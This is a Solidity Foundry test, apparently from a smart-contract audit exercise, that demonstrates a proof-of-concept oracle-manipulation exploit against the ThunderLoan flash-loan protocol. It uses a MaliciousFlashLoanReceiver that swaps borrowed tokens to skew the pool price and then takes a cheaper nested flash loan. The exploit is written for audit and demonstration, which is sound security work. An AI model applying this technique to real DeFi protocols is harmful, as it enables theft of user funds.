// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { MockTSwapPool } from "../mocks/MockTSwapPool.sol";
import { MockPoolFactory } from "../mocks/MockPoolFactory.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BaseTest is Test {
    ThunderLoan thunderLoanImplementation;
    MockPoolFactory mockPoolFactory;
    ERC1967Proxy proxy;
    ThunderLoan thunderLoan;

    ERC20Mock weth;
    ERC20Mock tokenA;

    address liquidity_Provider = address(10_000);
    address _user = address(56);

    function setUp() public virtual {
        thunderLoan = new ThunderLoan();
        mockPoolFactory = new MockPoolFactory();

        weth = new ERC20Mock();
        tokenA = new ERC20Mock();

        mockPoolFactory.createPool(address(tokenA));
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));
    }

    function test_OracleManipulation() public {
        // 1. setUp contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));

        address tSwapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. fund TSwap

        vm.startPrank(liquidity_Provider);
        tokenA.mint(liquidity_Provider, 100e18);
        tokenA.approve(address(tSwapPool), 100e18);
        weth.mint(liquidity_Provider, 100e18);
        weth.approve(address(tSwapPool), 100e18);
        BuffMockTSwap(tSwapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        vm.startPrank(liquidity_Provider);
        tokenA.mint(liquidity_Provider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("normal fee is: ", normalFeeCost);
        //  0.296147410319118389

        uint256 amountToBorrow = 50e18;
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(tSwapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );
        vm.startPrank(_user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();

        console.log("attack Fee:", attackFee);

        assert(attackFee < normalFeeCost);
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;

    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tSwapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tSwapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address,
        /* initiator*/
        bytes calldata /* params */
    )
        external
        returns (bool)
    {
        if (!attacked) {
            // 1. swap tokenA borrowed for WETH
            // 2. Take out Another flash loan, to show the difference
            feeOne = fee;
            attacked = true;
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
            // call flash loan again
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);
            IERC20(token).transfer(address(repayAddress), amount + fee);
        } else {
            // calculate fee and repay
            feeTwo = fee;
            // IERC20(token).approve(address(thunderLoan), amount + fee);
            // thunderLoan.repay(IERC20(token), amount + fee);

            IERC20(token).transfer(address(repayAddress), amount + fee);
        }
        return true;
    }
}

